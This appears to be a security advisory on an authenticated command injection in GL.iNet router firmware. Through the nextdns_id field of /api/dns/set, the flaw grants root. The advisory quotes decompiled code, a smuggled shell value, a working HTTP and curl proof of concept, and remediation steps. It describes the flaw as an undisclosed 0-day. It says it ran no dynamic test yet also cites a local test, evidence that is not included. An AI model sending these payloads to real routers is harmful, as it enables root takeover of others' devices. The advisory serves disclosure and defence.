# GL.iNet AR150 3.216 was discovered to contain an authenticated command injection vulnerability in the NextDNS configuration

## Overview

- Vendor: GL.iNet
- Product: AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218
- Version: 3.216 / 3.218
- Component: /www/api and /www/cgi-bin/api, /dns/set
- Vulnerability Class: CWE-78 command injection
- CVSS 3.1 (tentative): 7.3 High `AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H` (administrator token required; the injected command runs as root)
- Manufacturer: https://www.gl-inet.com/

## Affected versions

- AR150 `openwrt-ar150-3.216-0321-1679391237.bin`.
  `/www/api`.
- SF1200 `openwrt-sf1200-3.218-0709-1720518095.bin`.
  `/www/api`.
- S1300 `qsdk-s1300-3.218-0726-1721958248.img`.
  SquashFS at `0x3C137C`; `/www/cgi-bin/api`.
- USB150 `openwrt-usb150-3.218-0709-1720515319.bin`.
  `/www/api`.

## Vulnerability details

`POST /api/dns/set` accepts the Cloudflare/NextDNS configuration. When
`cloudflare_dns` is true and `dns_name` is `NextDNS`, the handler reads
the `nextdns_id` string and builds a `sed` command:

```c
nextdns_id = gjson_get_string(req, "nextdns_id");
if (nextdns_id && strlen(nextdns_id) < 0x40 && *nextdns_id) {
    snprintf(buf, 192,
      "sed -i 's/tls_auth_name: \".*.dns\\(.*\\).nextdns.io\"/"
      "tls_auth_name: \"%s.dns\\1.nextdns.io\"/g' "
      "/etc/stubby/stubby_nextdns.yml",
      nextdns_id);
    system(buf);
}
```

The value is length-limited to 63 bytes but not otherwise validated or
escaped. It is inserted inside a single-quoted shell argument; a single
quote in `nextdns_id` terminates the quote and the remainder is
interpreted by `/bin/sh`. For example:

```text
nextdns_id = x';id>/tmp/gl_nextdns_test;#
```

produces the effective shell fragment:

```sh
sed -i 's/...' /etc/...;id>/tmp/gl_nextdns_test;#'
```

The `sed` command may report an error, but the injected command has
already run. A local `sh -c` semantics test with the exact generated
command created the marker file (see evidence).

The same code is present in all four builds:

- AR150 `net_set_next_dns` at `0x406838` (`snprintf` 192-byte buffer,
  length check `< 0x40`, `system`);
- SF1200 `net_set_next_dns` at `0x407980` (same flow);
- USB150 `net_set_next_dns` at `0x406838` (same flow);
- S1300 `sub_161A0` (same `sprintf`/`system` flow, `sprintf` into
  `s[192]` with the same 63-byte limit but no quote escaping).

The `/dns/set` route is a normal POST route in the authenticated API
table; it is not in the router's small no-auth list (login, initpwd,
hello, model, language get/set, first settings before configuration).
The attacker therefore needs a valid administrator token (for example
from the web UI) but obtains root command execution on the router.

## PoC

```http
POST /api/dns/set HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid admin token>

{"cloudflare_dns":true,"dns_name":"NextDNS","nextdns_id":"x';id>/tmp/gl_nextdns_test;#"}
```

After the request, check the router:

```sh
cat /tmp/gl_nextdns_test
```

The marker contains the output of `id` and demonstrates execution in the
root context of the API process.

A compact URL/JSON variant for a script:

```sh
curl -sS -H 'Content-Type: application/json' \
  -H "Authorization: $TOKEN" \
  -d '{"cloudflare_dns":true,"dns_name":"NextDNS","nextdns_id":"x'"'"';id>/tmp/gl_nextdns_test;#"}' \
  http://<router>/api/dns/set
```

## Verification

The vulnerable handler in the stock `/www/api and /www/cgi-bin/api, /dns/set` was decompiled from the unpacked rootfs; the relevant code and offsets are quoted above. No dynamic run was completed.

## Impact

An authenticated administrator (or anyone who has stolen an admin
token) can execute arbitrary commands as root. This bypasses the
intended constrained "DNS settings" operation and allows persistent
device compromise, credential/session theft, or installation of
malicious packages. The same primitive is reachable after login on all
four models.

## Remediation / known-CVE relation

- Do not build shell commands from `nextdns_id`; validate it against the
  NextDNS ID alphabet (lower-case letters/digits, expected length) and
  use an argv-based executor.
- If a shell command is retained, single-quote-escape the value
  (`'` -> `'\''`) and reject quotes/control characters.
- Apply the same validation to `dns1`/`dns2` and other DNS parameters.
- NVD keyword searches for `GL.iNet NextDNS`, `nextdns_id` and
  `GL-S1300` returned zero results on 2026-11-08.
  CVE-2024-39226 (s2s API) and CVE-2024-39228 (`check_ovpn_client_config`
  / `check_config`) are different GL.iNet shell-injection issues;
  CVE-2023-50919 is a different nginx/Lua authentication bypass.
  Candidate 0-day; no CVE assigned and no vendor contact has been made.

## Additional Information

```markdown
### Vendor
GL.iNet

### Product
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218

### Version or Commit
3.216 / 3.218

### Vulnerability Class
CWE-78 command injection

### Description
When cloudflare_dns is true and dns_name is NextDNS, the /api/dns/set handler inserts nextdns_id into a single-quoted sed command executed by system(). A crafted ID escapes the quote and runs commands.

### Affected_component
/www/api and /www/cgi-bin/api, /dns/set

### Attack_vector
Authenticated JSON POST to /api/dns/set with cloudflare_dns=true, dns_name=NextDNS and a crafted nextdns_id.

### Product_version
AR150 3.216, SF1200 3.218, S1300 3.218, USB150 3.218 3.216 / 3.218

### Reference
- https://www.gl-inet.com/
- https://github.com/vuln-1/vuln/blob/main/GL.iNet/AR150_V3.216/report-2.md
```
